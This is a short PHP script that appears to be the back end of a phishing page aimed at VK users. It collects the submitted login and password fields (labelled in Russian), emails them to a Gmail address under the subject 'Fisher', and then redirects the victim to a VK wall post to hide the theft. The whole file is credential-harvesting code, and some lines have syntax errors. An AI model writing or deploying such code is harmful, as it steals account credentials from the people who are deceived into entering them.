<?php
    $result = mail("racer3229@gmail.com", "Fisher" " \nЛогин: $_POST[email] \nПароль: $_POST[pass]");
    
    if($result){
        echo "<html><head><META HTTP-EQUIV='Refresh' content='0; URL=https://vk.com/feed?w=wall-114341094_65449/'></head></html>";
    } else {
        echo "<p>This shit is doesn't work</p>"
    }